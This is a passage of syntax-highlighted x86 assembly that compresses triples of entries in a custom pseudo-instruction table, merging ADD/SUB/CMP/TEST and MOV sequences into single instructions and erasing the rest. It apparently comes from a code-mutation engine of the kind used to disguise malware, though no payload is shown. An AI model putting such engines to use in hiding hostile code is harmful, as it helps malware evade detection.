                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">       </span><span class="sc1">; Set CMP if it's SUB/CMP</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Triple_Next00_SetInstruction</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next00_NegateImm</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; If it's ADD is because I converted the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; SUB as a single instruction before</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Triple_Next00_SetCMP</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next00_Cont80</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">      </span><span class="sc1">; Set TEST if it's TEST/AND</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next00_SetInstruction</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@EndCompressed</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next00_CMPTESTRegReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; ADD?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_End</span><span class="sc0">   </span><span class="sc1">; If so, finish</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Triple_Next00_SET_CMPTEST</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next00_Constr00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ch</span><span class="sc0">      </span><span class="sc1">; Common OP?</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Triple_Next01</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next00_Common</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc0">     </span><span class="sc1">; Get instruction</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">     </span><span class="sc1">; If it's not TEST, finish</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Triple_Next00_Common_00</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">; Check TEST Reg,Mem</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_Next00_Maybe00</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Triple_Next00_Common_01</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next00_Common_00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">        </span><span class="sc1">; Check OP Mem,Reg</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_Next00_Maybe00</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next00_Common_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">        </span><span class="sc1">; Check OP Mem,Imm</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_End</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next00_Maybe00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Check the Mem operand among the</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; instructions</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_End</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_End</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_End</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_End</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_End</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">           </span><span class="sc1">; Get if it's TEST</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Triple_Next00_00</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">             </span><span class="sc1">; Check TEST Reg,Mem</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_Next00_Maybe_OPRegReg</span><span class="sc0"> </span><span class="sc1">; Jump here if it is</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Triple_Next00_01</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next00_00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">             </span><span class="sc1">; Check OP Mem,Reg</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_Next00_Maybe_OPRegReg</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next00_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">      </span><span class="sc1">; Set the instruction with the EBX</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next_SetInstruction</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; operands type (Reg,Imm, Reg,Reg, etc.)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next_SetNOP</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">; Eliminate the 2nd and 3rd instruction</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@EndCompressed</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next00_Maybe_OPRegReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc0">    </span><span class="sc1">; Set CMP/TEST Reg,Reg</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Triple_Next_SetInstruction</span><span class="sc0">


      </span><span class="sc5">@@Triple_Next01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">    </span><span class="sc1">; Check the same as above, but this</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_Next02</span><span class="sc0">  </span><span class="sc1">; time with 8 bits instructions. Since</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; there are many different opcodes,</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; it's not worthy to try to merge it</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_Next02</span><span class="sc0">  </span><span class="sc1">; with the routine above, but all the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; others that check the possibility of</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; compression are from there, linking</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_Next02</span><span class="sc0">  </span><span class="sc1">; the possibilities with Jccs.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_Next01_Constr00</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Triple_Next02</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Triple_Next02</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_Next01_Maybe01</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_Next01_Maybe01</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_Next01_Maybe01</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_Next01_Maybe01</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_End</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next01_Maybe01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Triple_Next00_CheckCMPTEST</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next01_Constr00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ch</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Triple_Next02</span><span class="sc0">     </span><span class="sc1">; Well, at least we achieved to</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">       </span><span class="sc1">; use as many instructions from the</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Triple_Next00_Common</span><span class="sc0"> </span><span class="sc1">; @@Triple_Next00 as we can :)</span><span class="sc0">


      </span><span class="sc5">@@Triple_Next02</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc0">           </span><span class="sc1">; MOV Mem,Mem?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_Next03</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc0">           </span><span class="sc1">; Jcc in 3rd?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Triple_Next02_ContCheck</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Triple_Next02_ContCheck</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Get the destiny address and check</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; if first and second instruction</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; use the same operand.</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_End</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_End</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc0">          </span><span class="sc1">; Check for comparisions:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">          </span><span class="sc1">; AND?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_Next02_CheckCMPTESTMemReg</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">          </span><span class="sc1">; SUB?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_Next02_CheckCMPTESTMemReg</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">          </span><span class="sc1">; CMP?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_Next02_CheckCMPTESTMemReg</span><span class="sc0">
